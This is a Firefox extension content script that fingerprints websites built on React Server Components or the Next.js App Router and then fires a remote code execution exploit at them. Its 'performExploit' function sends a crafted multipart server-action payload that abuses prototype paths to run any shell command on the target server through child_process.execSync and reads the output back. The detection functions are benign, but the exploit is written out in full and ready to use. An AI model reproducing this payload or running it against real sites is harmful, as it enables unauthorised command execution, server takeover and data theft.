// content.js - Firefox version

// === 1. Passive Detection ===
function performPassiveScan() {
    let score = 0;
    let details = [];
    const html = document.documentElement.outerHTML;

    if (document.contentType === "text/x-component") {
        score += 100;
        details.push("Found: Content-Type text/x-component");
    }
    if (/(window|self)\.__next_f\s*=/.test(html)) {
        score += 80;
        details.push("Found: window.__next_f (App Router)");
    }
    if (html.includes("react-server-dom-webpack")) {
        score += 30;
        details.push("Found: react-server-dom-webpack");
    }
    return { isRSC: score >= 50, details: details };
}

// === 2. Active Fingerprint ===
async function performFingerprint() {
    try {
        const res = await fetch(window.location.href, {
            method: 'GET',
            headers: { 'RSC': '1' }
        });

        let details = [];
        const cType = res.headers.get('Content-Type') || "";
        const vary = res.headers.get('Vary') || "";
        const text = await res.text();

        if (cType.includes('text/x-component')) details.push("Response Content-Type became text/x-component");
        if (vary.includes('RSC')) details.push("Vary header contains 'RSC'");
        if (/^\d+:["IHL]/.test(text)) details.push("Body structure matches React Flight Protocol");

        return { detected: details.length > 0, details: details };
    } catch (e) {
        return { detected: false, details: ["Network Error"] };
    }
}

// === 3. RCE Exploit ===
async function performExploit(cmd) {
    const targetCmd = cmd || "echo vulnerability_test";

    const payloadJson = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('${targetCmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
    const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
    const bodyParts = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="0"',
        '',
        payloadJson,
        `--${boundary}`,
        'Content-Disposition: form-data; name="1"',
        '',
        '"$@0"',
        `--${boundary}`,
        'Content-Disposition: form-data; name="2"',
        '',
        '[]',
        `--${boundary}--`,
        ''
    ].join('\r\n');

    const targetUrl = "/adfa";

    try {
        const res = await fetch(targetUrl, {
            method: 'POST',
            headers: {
                'Next-Action': 'x',
                'X-Nextjs-Request-Id': '7a3f9c1e',
                'X-Nextjs-Html-Request-ld': '9bK2mPaRtVwXyZ3S@!sT7u',
                'Content-Type': `multipart/form-data; boundary=${boundary}`,
                'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9'
            },
            body: bodyParts
        });

        const responseText = await res.text();
        const digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);

        if (digestMatch && digestMatch[1]) {
            let rawBase64 = digestMatch[1];

            try {
                let cleanBase64 = JSON.parse(`"${rawBase64}"`);
                const decodedStr = new TextDecoder().decode(
                    Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0))
                );

                return {
                    success: true,
                    output: decodedStr
                };
            } catch (parseError) {
                return {
                    success: false,
                    msg: "Decoding Error: " + parseError.message,
                    debug: rawBase64
                };
            }
        } else {
            return {
                success: false,
                msg: "Exploit Failed: 'digest' key not found.",
                debug: responseText.substring(0, 100)
            };
        }

    } catch (e) {
        return { success: false, msg: "Network/Request Error: " + e.message };
    }
}

// === Message Listener & Initialization ===
const passiveData = performPassiveScan();
if(passiveData.isRSC) browser.runtime.sendMessage({ action: "update_badge" });

browser.runtime.onMessage.addListener((req, sender, sendResponse) => {
    if (req.action === "get_passive") {
        sendResponse(passiveData);
        return;
    }
    if (req.action === "run_fingerprint") {
        performFingerprint().then(res => sendResponse(res));
        return true;
    }
    if (req.action === "run_exploit") {
        performExploit(req.cmd).then(res => sendResponse(res));
        return true;
    }
});
